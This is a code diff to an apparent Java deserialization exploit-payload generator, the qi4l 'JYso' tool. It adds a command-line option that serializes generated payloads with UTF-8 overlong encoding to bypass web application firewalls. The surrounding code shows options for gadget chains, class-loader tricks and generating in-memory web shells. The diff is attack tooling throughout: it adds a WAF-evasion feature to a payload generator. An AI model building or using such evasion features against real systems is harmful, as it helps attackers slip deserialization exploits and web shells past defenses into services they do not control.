@@ -9,18 +9,21 @@ import com.qi4l.jndi.gadgets.utils.Serializer;
 import com.qi4l.jndi.gadgets.utils.Strings;
 import com.qi4l.jndi.gadgets.utils.dirty.DirtyDataWrapper;
 import org.apache.commons.cli.*;
+import com.qi4l.jndi.gadgets.utils.utf8OverlongEncoding.CustomObjectOutputStream;
 
 
 import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.util.*;
 
+
+import static com.qi4l.jndi.gadgets.Config.Config.IS_UTF_Bypass;
 import static com.qi4l.jndi.gadgets.utils.HexUtils.generatePassword;
 import static com.qi4l.jndi.gadgets.utils.Strings.isFromExploit;
 
 public class Starter {
 
-    public static CommandLine cmdLine;
+    public static  CommandLine              cmdLine;
 
     public static String JYsoMode = "qi4L";
 
@@ -58,6 +61,7 @@ public class Starter {
             options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
             options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
             options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
+            options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
 
             CommandLineParser parser = new DefaultParser();
 
@@ -132,6 +136,10 @@ public class Starter {
                 Config.USING_RHINO = true;
             }
 
+            if (cmdLine.hasOption("utf8-Overlong-Encoding")) {
+                Config.IS_UTF_Bypass = true;
+            }
+
             if (cmdLine.hasOption("gen-mem-shell")) {
                 Config.GEN_MEM_SHELL = true;
 
@@ -174,6 +182,7 @@ public class Starter {
 
                 // 储存生成的 payload
                 PAYLOAD = object;
+
                 if (isFromExploit()) {
                     return;
                 }
@@ -185,9 +194,13 @@ public class Starter {
                 } else {
                     out = System.out;
                 }
-                Serializer.qiserialize(object, out);
-                ObjectPayload.Utils.releasePayload(payload, object);
-
+                if (IS_UTF_Bypass){
+                    Serializer.qiserialize4l(object, out);
+                    ObjectPayload.Utils.releasePayload(payload, object);
+                } else {
+                    Serializer.qiserialize(object, out);
+                    ObjectPayload.Utils.releasePayload(payload, object);
+                }
                 out.flush();
                 out.close();
             } catch (Throwable e) {
